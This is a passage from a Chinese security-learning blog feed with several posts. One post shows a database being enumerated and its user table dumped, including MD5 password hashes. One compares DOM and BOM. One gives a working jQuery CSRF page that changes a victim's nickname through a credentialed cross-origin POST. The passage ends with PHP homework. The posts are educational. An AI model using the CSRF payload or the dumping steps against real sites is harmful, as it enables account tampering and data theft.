def           | performance_schema | users      | TOTAL_CONNECTIONS   |                3 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL            | bigint(20)       |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>在这里总结出content表和users表分别拥有的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content: id title author value time ip</span><br><span class="line">users: id username passwd user_ip join_date</span><br></pre></td></tr></table></figure><p>最后依次通过查询各表中的字段来读取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id from ceshi.content ;</span><br><span class="line">+----+</span><br><span class="line">| id |</span><br><span class="line">+----+</span><br><span class="line">|  1 |</span><br><span class="line">|  2 |</span><br><span class="line">|  3 |</span><br><span class="line">|  4 |</span><br><span class="line">|  5 |</span><br><span class="line">|  6 |</span><br><span class="line">|  7 |</span><br><span class="line">|  8 |</span><br><span class="line">|  9 |</span><br><span class="line">| 10 |</span><br><span class="line">| 11 |</span><br><span class="line">| 12 |</span><br><span class="line">| 13 |</span><br><span class="line">| 14 |</span><br><span class="line">| 15 |</span><br><span class="line">| 16 |</span><br><span class="line">| 17 |</span><br><span class="line">| 18 |</span><br><span class="line">| 19 |</span><br><span class="line">| 20 |</span><br><span class="line">+----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select title from ceshi.content ;</span><br><span class="line">+------------+</span><br><span class="line">| title      |</span><br><span class="line">+------------+</span><br><span class="line">| mmmn       |</span><br><span class="line">| zzzzsadfas |</span><br><span class="line">| asfwefas   |</span><br><span class="line">| qqq        |</span><br><span class="line">| qqq        |</span><br><span class="line">| asdfas     |</span><br><span class="line">| zzzsafd    |</span><br><span class="line">| wqeras     |</span><br><span class="line">| asfasdf    |</span><br><span class="line">| poikj      |</span><br><span class="line">| efadsfa    |</span><br><span class="line">|            |</span><br><span class="line">| pdo        |</span><br><span class="line">| testtitle  |</span><br><span class="line">| sad        |</span><br><span class="line">| 16161616   |</span><br><span class="line">| 17         |</span><br><span class="line">| adasf      |</span><br><span class="line">| awawaw     |</span><br><span class="line">| sdaf       |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select author from ceshi.content ;</span><br><span class="line">+------------+</span><br><span class="line">| author     |</span><br><span class="line">+------------+</span><br><span class="line">| nbnbn      |</span><br><span class="line">| fasdfwf    |</span><br><span class="line">| adsfasf    |</span><br><span class="line">| aaa        |</span><br><span class="line">| aaa        |</span><br><span class="line">| dasfaa     |</span><br><span class="line">| sadfasdf   |</span><br><span class="line">| asdf       |</span><br><span class="line">| asdfas     |</span><br><span class="line">| htjg       |</span><br><span class="line">| asdfasfd   |</span><br><span class="line">|            |</span><br><span class="line">| sdasd      |</span><br><span class="line">| sdfa       |</span><br><span class="line">| dsda       |</span><br><span class="line">| 1616161616 |</span><br><span class="line">| 17         |</span><br><span class="line">| asfasdf    |</span><br><span class="line">| sdafasf    |</span><br><span class="line">| asdfasfd   |</span><br><span class="line">+------------+</span><br><span class="line">20 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id from ceshi.users ;</span><br><span class="line">+----+</span><br><span class="line">| id |</span><br><span class="line">+----+</span><br><span class="line">|  1 |</span><br><span class="line">|  8 |</span><br><span class="line">|  9 |</span><br><span class="line">| 10 |</span><br><span class="line">+----+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username from ceshi.users ;</span><br><span class="line">+----------+</span><br><span class="line">| username |</span><br><span class="line">+----------+</span><br><span class="line">| admin    |</span><br><span class="line">| booom    |</span><br><span class="line">| sadfasdf |</span><br><span class="line">| zfzv     |</span><br><span class="line">+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select passwd from ceshi.users;</span><br><span class="line">+----------------------------------+</span><br><span class="line">| passwd                           |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 156756811d9c56c11ebccdef355bf4e0 |</span><br><span class="line">| a6be11c879133def33fdb767be80056f |</span><br><span class="line">| f95adbce0a51589cb6e87112eb6becd4 |</span><br><span class="line">+----------------------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>依此类推</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;放在了ceshi数据库里&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DOM与BOM的异同</title>
    <link href="https://0xxk.github.io/2019/08/11/DOM%E5%92%8CBOM/"/>
    <id>https://0xxk.github.io/2019/08/11/DOM和BOM/</id>
    <published>2019-08-11T14:49:49.784Z</published>
    <updated>2019-08-01T16:03:45.509Z</updated>
    
    <content type="html"><![CDATA[<p>​    DOM操作页面，BOM操作浏览器。听到这句话时，我感觉自己的基础不是很扎实。脑海里复现的问题竟然是DOM是什么？BOM是什么？</p><a id="more"></a><p>  为什么COM能操作页面？为什么BOM能操作浏览器？他们之间有什么共同点？有什么不同点呢？既然问题出来了，那我们就一一百度解决！</p><h1 id="DOM是什么？"><a href="#DOM是什么？" class="headerlink" title="DOM是什么？"></a>DOM是什么？</h1><p>​     DOM全称Document Object Model，即文档对象模型。我理解的DOM是一个接口，它接在HTML代码中。就像document.getElementById(‘xxx’)一样，它把Id为“myBtn”的节点“引用”到了这里。就相当于API接口，这样用脚本（JS）控制Web界面就很方便。（观点浅薄，请自行深入）</p><h1 id="BOM是什么？"><a href="#BOM是什么？" class="headerlink" title="BOM是什么？"></a>BOM是什么？</h1><p>​      BOM全称Browser Object Model，即浏览器对象模型。它也是接口，它的口接在全局对象中。也就是可以网页中，我们可以通过BOM接口加上一些动作来对浏览器进行控制。</p><h1 id="为什么COM能操作页面？为什么BOM能操作浏览器？"><a href="#为什么COM能操作页面？为什么BOM能操作浏览器？" class="headerlink" title="为什么COM能操作页面？为什么BOM能操作浏览器？"></a>为什么COM能操作页面？为什么BOM能操作浏览器？</h1><p>​      因为它们都是各自对象模型的接口（分别对应：文档对象模型，浏览器对象模型）。就像一个是手机的屏幕，一个是汽车的方向盘。都能都过对应的那一个点去操控各自的模型。</p><h1 id="他们之间有什么共同点？有什么不同点呢？"><a href="#他们之间有什么共同点？有什么不同点呢？" class="headerlink" title="他们之间有什么共同点？有什么不同点呢？"></a>他们之间有什么共同点？有什么不同点呢？</h1><h2 id="浅谈"><a href="#浅谈" class="headerlink" title="浅谈"></a>浅谈</h2><ul><li><p>不同点：各自操作不同的模型。</p></li><li><p>相同点：你中有我，我中有你。</p></li></ul><h2 id="深论"><a href="#深论" class="headerlink" title="深论"></a>深论</h2><p>  <strong>javascript由三部分组成：ECMAScript,DOM,BOM组成。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOM是W3C的标准；[所有浏览器公共遵守的标准]</span><br><span class="line">BOM是各个浏览器厂商根据DOM在各自浏览器上的实现;[表现为不同浏览器定义有差别，实现方式不同]</span><br><span class="line">window是BOM对象，而非js对象。</span><br></pre></td></tr></table></figure><p>​      <u>DOM（文档对象模型）是HTML和XML的应用程序接口（API）</u>。<br>​      <u>BOM主要处理浏览器窗口和框架，不过通常浏览器特定的JavaScript扩展都被看做BOM的一部分</u>。这些扩展包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">弹出新的浏览器窗口</span><br><span class="line">移动、关闭浏览器窗口以及调整窗口大小</span><br><span class="line">提供web浏览器详细信息的定位对象</span><br><span class="line">提供用户品目分辨率详细信息的屏幕对象</span><br><span class="line">对cookie的支持</span><br><span class="line">IE扩展了BOM，加入了ActiveXObject类，可以通过JavaScript实例化Activex对象</span><br></pre></td></tr></table></figure><p>​    javascript是通过访问BOM对象来访问、控制、修改客户端（浏览器），由于BOM的window包含了document,window对象的属性和方法是直接可以使用而且被感知的，因此可以直接使用winodw对象的document属性。</p><p>​    通过document属性就可以访问、检索、修改XHTML文档内容与结构。因为document对象又是DOM模型的根节点。可以说，BOM包含了DOM(对象)，浏览器提供出来给予访问的是BOM对象，从BOM对象再访问到DOM对象，从而js可以操作浏览器以及浏览器读取到的文档。其中DOM包含:window</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>window对象包含属性：document、location、navigater、screen、history、frames。</li></ul><ul><li><p>Document根节点包含子节点：forms、location、anchors、images、links</p><p>从window.document已然可以看出，DOM最根本的对象是BOM window对象的子对象。</p><p>参考链接：<a href="https://blog.csdn.net/xiao_tommy/article/details/53231165" target="_blank" rel="noopener">https://blog.csdn.net/xiao_tommy/article/details/53231165</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    DOM操作页面，BOM操作浏览器。听到这句话时，我感觉自己的基础不是很扎实。脑海里复现的问题竟然是DOM是什么？BOM是什么？&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="https://0xxk.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>CSRF JQ POST提交</title>
    <link href="https://0xxk.github.io/2019/08/11/CSRF%20JQ%20POST%E6%8F%90%E4%BA%A4/"/>
    <id>https://0xxk.github.io/2019/08/11/CSRF JQ POST提交/</id>
    <published>2019-08-11T14:49:49.780Z</published>
    <updated>2019-08-04T16:23:40.719Z</updated>
    
    <content type="html"><![CDATA[<p>​      在温习完前端后，继续学习了JS JQ。在讲JQ时，讲师用JQ本地复现了一遍CSRF。因为我对CSRF的理解一直处于概念上，所以就此机会将JQ复现代码学习理解一遍！</p><a id="more"></a><p>某小游戏网csrf POST更改账户信息。代码具体如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>jquery<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://libs.baidu.com/jquery/2.0.0/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">      type: 'POST',</span><br><span class="line">      url:'http://www.xxxx.com/xxxapi/user/info',</span><br><span class="line">      dataType: 'json',</span><br><span class="line">      data: &#123;</span><br><span class="line">        "headimg":"/static/usericon/userphoto20.png",</span><br><span class="line">"user_tag":[],</span><br><span class="line">"allow_status":"1",</span><br><span class="line">"nickname":"Leafer",</span><br><span class="line">"real_name":"",</span><br><span class="line">"id_number":""&#125;,</span><br><span class="line">      xhrFields: &#123;</span><br><span class="line">          withCredentials:true  //支持附带详细信息,可以携带cookie</span><br><span class="line">      &#125;,</span><br><span class="line">      crossDomain: true,//请求偏向外域,支持跨域请求</span><br><span class="line">      success: function (data) &#123;</span><br><span class="line">          console.log(data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本例 type为’POST’。type默认值为”GET”，可选”GET”或”POST”。</p><p>url为发送请求的地址。</p><p>dataType为传递的数据类型。本处为”JSON”。可用值如下：</p><p><u>“xml”:返回XML文档；</u></p><p><u>“html”:返回纯文本HTML信息；</u></p><p><u>“script”:返回纯文本JavaScript代码。</u></p><p><u>“json”:返回JSON数据</u></p><p><u>“jsconp”:JSONP格式</u></p><p><u>“text”:返回纯文本字符串。</u></p><p>xhrFields: {withCredentials:true}支持附带详细信息,携带cookie</p><p>crossDomain:ture 请求偏向外语，支持跨域请求</p><p>success: function (data) {console.log(data);}请求成功后在控制台输出data数据。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/08/3babf9af39fab821.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>访问页面后</p><p>参数为：<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/08/4f115aebee812020.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></p><p>响应值为：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/08/a50e9df7272892e2.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>再去查看自己的昵称</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/08/0e32c5dcff04e351.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​      在温习完前端后，继续学习了JS JQ。在讲JQ时，讲师用JQ本地复现了一遍CSRF。因为我对CSRF的理解一直处于概念上，所以就此机会将JQ复现代码学习理解一遍！&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>作业</title>
    <link href="https://0xxk.github.io/2019/08/11/%E4%BD%9C%E4%B8%9A/"/>
    <id>https://0xxk.github.io/2019/08/11/作业/</id>
    <published>2019-08-11T14:49:49.777Z</published>
    <updated>2019-08-11T12:30:58.494Z</updated>
    
    <content type="html"><![CDATA[<p>这是一份作业</p><a id="more"></a><p>素数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($l=<span class="number">2</span>;$l&lt;<span class="number">100</span>;$l++)&#123;</span><br><span class="line">    $M = $l;</span><br><span class="line">    $f=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">2</span>;$i&lt;$M;$i++)</span><br><span class="line">        <span class="keyword">if</span>($M % $i == <span class="number">0</span>)&#123;</span><br><span class="line">            $f = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($f==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $M.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>五角星</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;\n\n&quot;;</span><br><span class="line">for ( $i1 = 1; $i1 &lt; 6; $i1++ )                    /*这是五角星的上面一个角*/</span><br><span class="line">&#123;</span><br><span class="line">    for ( $j1 = 1; $j1 &lt; 19 - $i1; $j1++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $k1 = 1; $k1 &lt;= 2 * $i1 - 1; $k1++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    printf( &quot;\n&quot; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($i2 = 1; $i2 &lt; 5; $i2++ )                    /*这是五角星的中间两个角*/</span><br><span class="line">&#123;</span><br><span class="line">    for ( $j2 = 1; $j2 &lt; 3 * $i2 - 3; $j2++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $k2 = 1; $k2 &lt;= 42 - 6 * $i2; $k2++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    printf( &quot;\n&quot; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ( $i3 = 1; $i3 &lt; 3; $i3++ ) /*这是中间与下部相接的部分*/</span><br><span class="line">&#123;</span><br><span class="line">    for ( $j3 = 1; $j3 &lt; 12 - $i3; $j3++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $k3 = 1; $k3 &lt;= 12 + 2 * $i3; $k3++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    printf( &quot;\n&quot; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ( $i4 = 1; $i4 &lt; 5; $i4++ ) /*这是五角星的下面两个角*/</span><br><span class="line">&#123;</span><br><span class="line">    for ( $j4 = 1; $j4 &lt; 10 - $i4; $j4++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $k4 = 1; $k4 &lt;= 10 - 2 * $i4; $k4++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    for ( $m4 = 1; $m4 &lt; 6 * $i4 - 3; $m4++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $n4 = 1; $n4 &lt;= 10 - 2 * $i4; $n4++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    printf( &quot;\n&quot; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>循环输出关联数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$shuzu = array</span><br><span class="line">(    &apos;xm&apos; =&gt; &apos;zhiwei&apos;,    &apos;ming&apos; =&gt; &apos;zhiwei&apos;,    &apos;aaa&apos; =&gt; &apos;6666&apos;);$jian = array_keys($shuzu);</span><br><span class="line">echo $jian[1];for($i=0;$i&lt;count($jian);$i++)</span><br><span class="line">&#123;    echo $jian[$i].&quot;\n&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure><p>新闻界面</p><p>显示界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;!--先输出每列标题--&gt;</span><br><span class="line">&lt;!--再打开txt--&gt;</span><br><span class="line">&lt;!--读取出数据后，使用函数进行分割。--&gt;</span><br><span class="line">&lt;!--将分割完的存入数组--&gt;</span><br><span class="line">&lt;!--再将数组中的数据，按照格式每行输出。--&gt;</span><br><span class="line">&lt;!--列标题： 热度  标题   作者  发表时间  操作--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;&lt;?php echo &apos;ICQ新闻震撼部&apos;;?&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=&quot;tupian/bg.jpg&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;?php echo &quot;ICQ新闻震撼部&quot;;?&gt;&lt;/center&gt;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;&lt;button&gt;&lt;?php echo &quot;热度✍&quot;; ?&gt;&lt;/button&gt;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&lt;?php echo &quot;标题&quot;; ?&gt;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&lt;?php echo &quot;作者&quot;; ?&gt;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&lt;?php echo &quot;发表时间&quot;; ?&gt;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&lt;?php echo &quot;操作&quot;; ?&gt;&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $f = fopen(&quot;news.db&quot;,&quot;r&quot;);</span><br><span class="line">    $i=0;</span><br><span class="line">    while(!feof($f))&#123;</span><br><span class="line">        $hang = fgets($f);</span><br><span class="line">        $shuzu = explode(&quot;|&quot;,$hang);</span><br><span class="line"></span><br><span class="line">        $redu = base64_decode($shuzu[0]);</span><br><span class="line">        $biaoti = base64_decode($shuzu[1]);</span><br><span class="line">        $zuozhe = base64_decode($shuzu[2]);</span><br><span class="line">        $fashijian = base64_decode($shuzu[3]);</span><br><span class="line">        $caozuo = base64_decode($shuzu[4]);</span><br><span class="line">        $tupian = base64_decode($shuzu[5]);</span><br><span class="line">        $jianjie = substr(base64_decode($shuzu[6]),&quot;0&quot;,&quot;400&quot;);</span><br><span class="line">       echo  &lt;&lt;&lt;EOF</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td align=&quot;center&quot;&gt;$redu&lt;/td&gt;</span><br><span class="line">        &lt;td align=&quot;center&quot;&gt;$biaoti&lt;/td&gt;</span><br><span class="line">        &lt;td align=&quot;center&quot;&gt;$zuozhe&lt;/td&gt;</span><br><span class="line">        &lt;td align=&quot;center&quot;&gt;$fashijian&lt;/td&gt;</span><br><span class="line">        &lt;td align=&quot;center&quot;&gt;$caozuo&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">       if($i&lt;3)&#123;</span><br><span class="line">           echo &lt;&lt;&lt;EOF</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;$tupian&lt;/td&gt;</span><br><span class="line">        &lt;td colspan=&quot;4&quot;&gt;$jianjie&lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">           $i++;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/table&gt;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">&lt;center&gt;版权所有  ICQ&lt;/center&gt;</span><br><span class="line">&lt;center&gt;©2019 ICQ 意见反馈 京ICP证030173号  京公网安备11000002000001号 &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>上传前端</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"jieshou.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">accept-charset</span>=<span class="string">"utf-8"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        　　<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"lsUpfindBtn"</span>&gt;</span>上传图片 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span 